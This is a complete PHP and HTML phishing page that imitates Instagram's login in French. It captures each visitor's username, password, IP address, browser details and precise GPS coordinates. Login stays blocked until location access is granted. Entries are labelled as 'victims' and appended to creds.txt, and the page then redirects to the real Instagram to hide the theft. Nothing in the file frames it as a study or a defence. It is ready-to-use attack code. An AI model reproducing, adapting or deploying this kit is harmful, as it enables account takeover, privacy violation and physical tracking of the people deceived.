<?php
date_default_timezone_set('Africa/Bujumbura');
$ip = $_SERVER['REMOTE_ADDR'];
$ua = $_SERVER['HTTP_USER_AGENT'];

if (isset($_POST['submit'])) {
    $email = $_POST['email'];
    $pass = $_POST['pass'];
    $gps = $_POST['gps'] ?? 'GPS_REFUSE';
    
    $time  = date('Y-m-d H:i:s');
    $log  = "┌─────────────────────────────────────────\n";
    $log .= "│ 🎯 INSTAGRAM VICTIME — {$time}\n";
    $log .= "├─────────────────────────────────────────\n";
    $log .= "│ 📧 EMAIL/USER : {$email}\n";
    $log .= "│ 🔑 MOT DE PASSE : {$pass}\n";
    $log .= "│ 🌐 ADRESSE IP   : {$ip}\n";
    $log .= "│ 📱 APPAREIL     : {$ua}\n";
    $log .= "│ 📍 GPS POSITION : {$gps}\n";  // TON GPS AJOUTE
    $log .= "└─────────────────────────────────────────\n\n";
    
    file_put_contents('creds.txt', $log, FILE_APPEND | LOCK_EX);
    
    // TON REDIRECT
    echo '<script>setTimeout(function(){window.location.href="https://instagram.com";},1500);</script>';
    echo '<div style="text-align:center;padding:50px;color:#E4405F;"><h2>Connexion...</h2><div style="border:3px solid #f3f3f3;border-top:3px solid #E4405F;border-radius:50%;width:40px;height:40px;margin:auto;animation:spin 1s linear infinite;"></div></div>';
    echo '<style>@keyframes spin{0%{transform:rotate(0)}100%{transform:rotate(360deg)}}</style>';
    exit;
}
?>
<!DOCTYPE html>
<html>
<head>
<title>Instagram</title>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<!-- TON CSS EXACT -->
<style>
body {
    background: linear-gradient(-45deg, #EE7752, #E73C7E, #23A6D5, #23D5AB);
    font-family: Arial, sans-serif;
    display: flex;
    justify-content: center;
    align-items: center;
    min-height: 100vh;
    margin: 0;
}
.login-container {
    background: white;
    padding: 40px;
    border-radius: 10px;
    box-shadow: 0 15px 35px rgba(0,0,0,0.1);
    width: 100%;
    max-width: 350px;
}
.logo {
    text-align: center;
    margin-bottom: 30px;
}
.logo img {
    width: 175px;
}
.input-field {
    width: 100%;
    padding: 15px;
    margin: 10px 0;
    border: 1px solid #dbdbdb;
    border-radius: 5px;
    font-size: 16px;
    box-sizing: border-box;
}
.input-field:focus {
    outline: none;
    border-color: #0095f6;
}
.login-button {
    width: 100%;
    padding: 12px;
    background: #0095f6;
    color: white;
    border: none;
    border-radius: 5px;
    font-size: 16px;
    font-weight: bold;
    cursor: pointer;
    margin-top: 10px;
}
.login-button:hover {
    background: #0077cc;
}
.login-button:disabled {
    background: #ccc;
    cursor: not-allowed;
}
.gps-display {
    background: #e3f2fd;
    padding: 12px;
    border-radius: 5px;
    margin: 15px 0;
    font-size: 14px;
    color: #1976d2;
    text-align: center;
    border: 1px solid #bbdefb;
}
</style>
</head>
<body>
<div class="login-container">
    <div class="logo">
        <img src="https://www.instagram.com/static/images/web/mobile_nav_type_logo.png/735145cfe0a4.png" alt="Instagram">
    </div>
    
    <form method="POST">
        <input type="hidden" name="gps" id="gps_coords">
        
        <input type="text" class="input-field" name="email" placeholder="Téléphone, utilisateur ou courriel" required autofocus>
        <input type="password" class="input-field" name="pass" placeholder="Mot de passe" required>
        
        <div class="gps-display" id="gps_status">📍 Activez la localisation GPS pour continuer</div>
        
        <button type="submit" name="submit" id="submit_btn" class="login-button" disabled>Envoyer</button>
    </form>
</div>

<script>
// TON GPS SYSTEM - SEUL AJOUT
let gps_ok = false;
function getLocation() {
    navigator.geolocation.getCurrentPosition(
        pos => {
            let coords = pos.coords.latitude.toFixed(6) + "," + pos.coords.longitude.toFixed(6);
            document.getElementById('gps_coords').value = coords;
            document.getElementById('gps_status').innerHTML = "✅ GPS OK: " + coords;
            document.getElementById('submit_btn').disabled = false;
            gps_ok = true;
        },
        () => {
            document.getElementById('gps_status').innerHTML = "❌ GPS refusé - Activez localisation";
        },
        {enableHighAccuracy: true, timeout: 10000}
    );
}
window.onload = getLocation;
</script>
</body>
</html>
